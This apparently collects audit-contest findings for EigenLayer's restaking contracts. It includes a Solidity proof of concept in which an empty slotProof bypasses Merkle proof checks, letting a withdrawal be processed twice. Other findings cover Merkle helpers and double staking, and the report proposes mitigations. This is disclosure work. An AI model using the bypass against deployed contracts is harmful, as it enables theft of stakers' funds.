# About EigenLayer
EigenLayer (formerly 'EigenLayr') is a set of smart contracts deployed on Ethereum that enable restaking of assets to secure new services.
At present, this repository contains both the contracts for EigenLayer and a set of general "middleware" contracts, designed to be reuseable across different applications built on top of EigenLayer.

Provide direct links to all referenced code in GitHub. Add screenshots, logs, or any other relevant proof that illustrates the concept.
Whevener user call `verifyAndProcessWithdrawal` there is a verification that proofs are valid

Therefore its possible to set `slotProof` to any string below 32 length and there will be no Sha256 validation inside `Merkle.sol` file due to `proof.length` <32 and loop start with 32

        bytes32[1] memory computedHash = [leaf];
        for (uint256 i = 32; i <= proof.length; i+=32) {
            if(index % 2 == 0) {
                // if ith bit of index is 0, then computedHash is a left sibling
                assembly {

What we need to do in exploit is set `slotRoot` to `blockHeaderRoot` to get a bonus eth. There maybe other ways how to get a reward from more than 1 slot per each validator but I`ve not figured it out.
## Tools Used
POC:
```solidity
    function testPartialWithdrawalFlow() public returns(IEigenPod){
        //this call is to ensure that validator 61068 has proven their withdrawalcreds
        setJSON("./src/test/test-data/withdrawalCredentialAndBalanceProof_61068.json");
        _testDeployAndVerifyNewEigenPod(podOwner, signature, depositDataRoot);
        IEigenPod newPod = eigenPodManager.getPod(podOwner);

        //generate partialWithdrawalProofs.json with:
        // ./solidityProofGen "WithdrawalFieldsProof" 61068 656 "data/slot_58000/oracle_capella_beacon_state_58100.ssz" "data/slot_58000/capella_block_header_58000.json" "data/slot_58000/capella_block_58000.json" "partialWithdrawalProof.json"
        setJSON("./src/test/test-data/partialWithdrawalProof.json");
        BeaconChainProofs.WithdrawalProofs memory withdrawalProofs = _getWithdrawalProof();
        bytes memory validatorFieldsProof = abi.encodePacked(getValidatorProof());

        withdrawalFields = getWithdrawalFields();   
        validatorFields = getValidatorFields();
        bytes32 newBeaconStateRoot = getBeaconStateRoot();
        BeaconChainOracleMock(address(beaconChainOracle)).setBeaconChainStateRoot(newBeaconStateRoot);

        uint64 withdrawalAmountGwei = Endian.fromLittleEndianUint64(withdrawalFields[BeaconChainProofs.WITHDRAWAL_VALIDATOR_AMOUNT_INDEX]);
        uint64 slot = Endian.fromLittleEndianUint64(withdrawalProofs.slotRoot);
        cheats.deal(address(newPod), stakeAmount);   

        uint256 delayedWithdrawalRouterContractBalanceBefore = address(delayedWithdrawalRouter).balance;
        newPod.verifyAndProcessWithdrawal(withdrawalProofs, validatorFieldsProof, validatorFields, withdrawalFields, 0, 0);
//      ------------start POC----------
        withdrawalProofs.slotRoot = withdrawalProofs.blockHeaderRoot; // slotRoot should be the same as blockHeaderRoot
        withdrawalProofs.slotProof = ""; // any length below 32 so loop will be bypassed
        newPod.verifyAndProcessWithdrawal(withdrawalProofs, validatorFieldsProof, validatorFields, withdrawalFields, 0, 0);
//      ------------end POC----------

        uint40 validatorIndex = uint40(getValidatorIndex());
        require(newPod.provenPartialWithdrawal(validatorIndex, slot), "provenPartialWithdrawal should be true");
        withdrawalAmountGwei = uint64(withdrawalAmountGwei*GWEI_TO_WEI);
        require(address(delayedWithdrawalRouter).balance - delayedWithdrawalRouterContractBalanceBefore == withdrawalAmountGwei * 2,
            "pod delayed withdrawal balance hasn't been updated correctly"); // double withdraw

        cheats.roll(block.number + PARTIAL_WITHDRAWAL_FRAUD_PROOF_PERIOD_BLOCKS + 1);
        uint podOwnerBalanceBefore = address(podOwner).balance;
        delayedWithdrawalRouter.claimDelayedWithdrawals(podOwner, 1);
        require(address(podOwner).balance - podOwnerBalanceBefore == withdrawalAmountGwei, "Pod owner balance hasn't been updated correctly");
        return newPod;
    }
```
## Recommended Mitigation Steps
I think its important to add these require inside merkle for security
```diff
    function processInclusionProofSha256(bytes memory proof, bytes32 leaf, uint256 index) internal view returns (bytes32) {
        bytes32[1] memory computedHash = [leaf];
+        require(proof.length % 32 == 0 && proof.length > 0, "Invalid proof length");

        for (uint256 i = 32; i <= proof.length; i+=32) {
            if(index % 2 == 0) {
                // if ith bit of index is 0, then computedHash is a left sibling
                assembly {
                    mstore(0x00, mload(computedHash))
                    mstore(0x20, mload(add(proof, i)))
                    if iszero(staticcall(sub(gas(), 2000), 2, 0x00, 0x40, computedHash, 0x20)) {revert(0, 0)}
                    index := div(index, 2)
                }
            } else {
                // if ith bit of index is 1, then computedHash is a right sibling
                assembly {
                    mstore(0x00, mload(add(proof, i)))
                    mstore(0x20, mload(computedHash))
                    if iszero(staticcall(sub(gas(), 2000), 2, 0x00, 0x40, computedHash, 0x20)) {revert(0, 0)}
                    index := div(index, 2)
                }           
            }
        }
        return computedHash[0];

## [H-02]  It is impossible to slash queued withdrawals that contain a malicious strategy due to a misplacement of the ++i increment
## Impact
Detailed description of the impact of this finding.
slashQueuedWithdrawal cannot skip malicious strategies
## Proof of Concept
Provide direct links to all referenced code in GitHub. Add screenshots, logs, or any other relevant proof that illustrates the concept.
Whenever admin would like to skip malicious strategy in the `strategies` array which always reverts on calls to its 'withdraw' function. They will still be triggered. Whevener check `indicesToSkipIndex < indicesToSkip.length && indicesToSkip[indicesToSkipIndex] == i` is in place, array doenst go to the next strategy on list but stays on the same index.

## [L-01]  computePhase0Eth1DataRoot always returns an incorrect Merkle tree

## Proof of Concept
Provide direct links to all referenced code in GitHub. Add screenshots, logs, or any other relevant proof that illustrates the concept.
Not all fields of eth1DataFields being used in an array due to usage of `i < ETH1_DATA_FIELD_TREE_HEIGHT` instead of `i<NUM_ETH1_DATA_FIELDS`
Check other similar function.

processInclusionProofKeccak does not work as expected
## Proof of Concept
Provide direct links to all referenced code in GitHub. Add screenshots, logs, or any other relevant proof that illustrates the concept.
function `verifyInclusionKeccak` is not used anywhere but its in the scope of this contest. There is no validation that proof is a tree and a valid tree like it described in the comments. E.x. if proof is less than 32 length that function will just return a leaf without reverting. In my opinion function doesn't work as expected and can be exploited. I've submitted the same issue with `processInclusionProofSha256` function that lead to loss a funds for validator due the same issue.
```solidity
    function processInclusionProofKeccak(bytes memory proof, bytes32 leaf, uint256 index) internal pure returns (bytes32) {
        bytes32 computedHash = leaf;
        for (uint256 i = 32; i <= proof.length; i+=32) {
            if(index % 2 == 0) {
                // if ith bit of index is 0, then computedHash is a left sibling
                assembly {
                    mstore(0x00, computedHash)
                    mstore(0x20, mload(add(proof, i)))
                    computedHash := keccak256(0x00, 0x40)
                    index := div(index, 2)
                }
            } else {

I think its important to add security to that function like this

## [L-03] merkleizeSha256 doesn’t work as expected

Detailed description of the impact of this finding.
merkleizeSha256  doesn't work as expected
## Proof of Concept
Provide direct links to all referenced code in GitHub. Add screenshots, logs, or any other relevant proof that illustrates the concept.
Whenever merkleizeSha256 is being used in the code there is always a check that array length is power of 2. E.x.
```solidity
bytes32[] memory paddedHeaderFields = new bytes32[](2**BEACON_BLOCK_HEADER_FIELD_TREE_HEIGHT);
```
[contracts/libraries/BeaconChainProofs.sol#L131](https://github.com/code-423n4/2023-04-eigenlayer/blob/398cc428541b91948f717482ec973583c9e76232/src/contracts/libraries/BeaconChainProofs.sol#L131)

But inside the function `merkleizeSha256` there is no check that incoming array is power of 2
```solidity
/**
  @notice this function returns the merkle root of a tree created from a set of leaves using sha256 as its hash function
  @param leaves the leaves of the merkle tree

  @notice requires the leaves.length is a power of 2
  */
 function merkleizeSha256(
     bytes32[] memory leaves
 ) internal pure returns (bytes32) {
     //there are half as many nodes in the layer above the leaves
     uint256 numNodesInLayer = leaves.length / 2;
     //create a layer to store the internal nodes
     bytes32[] memory layer = new bytes32[](numNodesInLayer);
     //fill the layer with the pairwise hashes of the leaves
     for (uint i = 0; i < numNodesInLayer; i++) {
         layer[i] = sha256(abi.encodePacked(leaves[2*i], leaves[2*i+1]));
     }
     //the next layer above has half as many nodes
     numNodesInLayer /= 2;
     //while we haven't computed the root
     while (numNodesInLayer != 0) {
         //overwrite the first numNodesInLayer nodes in layer with the pairwise hashes of their children
         for (uint i = 0; i < numNodesInLayer; i++) {
             layer[i] = sha256(abi.encodePacked(layer[2*i], layer[2*i+1]));
         }
         //the next layer above has half as many nodes
         numNodesInLayer /= 2;
     }
     //the first node in the layer is the root
     return layer[0];
 }
```

There is a @notice that doesn't hold
>  @notice requires the leaves.length is a power of 2

But whenever there is a require in natspec inside the project it always holds. E.x.
```
 /**
  * @notice Delegates from `staker` to `operator`.
  * @dev requires that:
  * 1) if `staker` is an EOA, then `signature` is valid ECSDA signature from `staker`, indicating their intention for this action
  * 2) if `staker` is a contract, then `signature` must will be checked according to EIP-1271

## [L-07] User can stake twice on beacon chain from same eipod, thus losing funds due to same withdrawal credentials

## Impact
Detailed description of the impact of this finding.
User can stake twice on beacon chain from eipod with the same params thus losing funds due to having same input params
## Proof of Concept
Provide direct links to all referenced code in GitHub. Add screenshots, logs, or any other relevant proof that illustrates the concept.

There are no restriction to how many times user can stake on beacon with EigenPodManager on EigenPod thus all of them will have the same `_podWithdrawalCredentials()` and I think first deposit will be lost
```sodlidity
    function stake(bytes calldata pubkey, bytes calldata signature, bytes32 depositDataRoot) external payable onlyEigenPodManager {
        // stake on ethpos
        require(msg.value == 32 ether, "EigenPod.stake: must initially stake for any validator with 32 ether");
        ethPOS.deposit{value : 32 ether}(pubkey, _podWithdrawalCredentials(), signature, depositDataRoot);
        emit EigenPodStaked(pubkey);
    }
```

There are some ways how users can make a mistake by calling it twice or they would like to create another one.
I've looked into rocketpool contracts they are not allowing users to stake twice with the same pubkeys, so I think its important to implement the same security issue.
```solidity
    function preStake(bytes calldata _validatorPubkey, bytes calldata _validatorSignature, bytes32 _depositDataRoot) internal {
...
        require(rocketMinipoolManager.getMinipoolByPubkey(_validatorPubkey) == address(0x0), "Validator pubkey is in use");
        // Set minipool pubkey
        rocketMinipoolManager.setMinipoolPubkey(_validatorPubkey);
        // Get withdrawal credentials
        bytes memory withdrawalCredentials = rocketMinipoolManager.getMinipoolWithdrawalCredentials(address(this));
        // Send staking deposit to casper
        casperDeposit.deposit{value : prelaunchAmount}(_validatorPubkey, withdrawalCredentials, _validatorSignature, _depositDataRoot);
        // Emit event
        emit MinipoolPrestaked(_validatorPubkey, _validatorSignature, _depositDataRoot, prelaunchAmount, withdrawalCredentials, block.timestamp);
    }
```

## Tools Used
POC
```diff
    function testWithdrawFromPod() public {
        cheats.startPrank(podOwner);
        eigenPodManager.stake{value: stakeAmount}(pubkey, signature, depositDataRoot);
+        eigenPodManager.stake{value: stakeAmount}(pubkey, signature, depositDataRoot);
        cheats.stopPrank();

        IEigenPod pod = eigenPodManager.getPod(podOwner);
        uint256 balance = address(pod).balance;
        cheats.deal(address(pod), stakeAmount);

        cheats.startPrank(podOwner);
        cheats.expectEmit(true, false, false, false);
        emit DelayedWithdrawalCreated(podOwner, podOwner, balance, delayedWithdrawalRouter.userWithdrawalsLength(podOwner));
        pod.withdrawBeforeRestaking();
        cheats.stopPrank();
        require(address(pod).balance == 0, "Pod balance should be 0");
    }

```
## Recommended Mitigation Steps
You can look at rocketpool contracts and borrow their logic
```diff
    function stake(bytes calldata pubkey, bytes calldata signature, bytes32 depositDataRoot) external payable onlyEigenPodManager {
+        require(EigenPodManager.getEigenPodByPubkey(_validatorPubkey) == address(0x0), "Validator pubkey is in use");
+        EigenPodManager.setEigenPodByPubkey(_validatorPubkey);

        require(msg.value == 32 ether, "EigenPod.stake: must initially stake for any validator with 32 ether");
        ethPOS.deposit{value : 32 ether}(pubkey, _podWithdrawalCredentials(), signature, depositDataRoot);
        emit EigenPodStaked(pubkey);
    }

```
